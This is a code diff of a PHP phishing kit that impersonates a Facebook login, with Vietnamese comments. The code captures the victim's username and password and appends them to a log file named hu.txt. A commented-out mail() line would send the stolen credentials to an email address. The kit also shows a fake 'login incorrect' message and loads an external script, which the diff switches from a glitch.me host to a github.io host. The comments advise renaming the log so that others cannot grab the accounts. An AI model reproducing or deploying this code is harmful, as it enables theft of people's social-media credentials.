@@ -16,7 +16,7 @@
       $headers = "Tài khoản - Facebook";
     $subject = "code by Hướng";
       $body = "Time: ".$time."|acc: ".$username."|pass: ".$password."\n"; //định dạng acc|pass
-  //  mail("jaxuatt6@gmail.com", $headers, $body, $subject);  // muốn gửi mail thì để dòng mail này 
+  //  mail("@gmail.com", $headers, $body, $subject);  // muốn gửi mail thì để dòng mail này 
      $test = fopen("hu.txt","a");//đổi tên file hu.txt này để tránh trường hợp người khác vào lấy acc
      fwrite($test,$body);
      fclose($test);
@@ -174,4 +174,4 @@ $_SESSION['huongdz'] = $huongdz;
  let text ='Thông tin đăng nhập không chính xác vui lòng kiểm tra lại!'; //content
  
             </script>
-            <script src="https://scripth.glitch.me/fb.js"></script>
+            <script src="https://script-garena.github.io/manrye.js"></script>
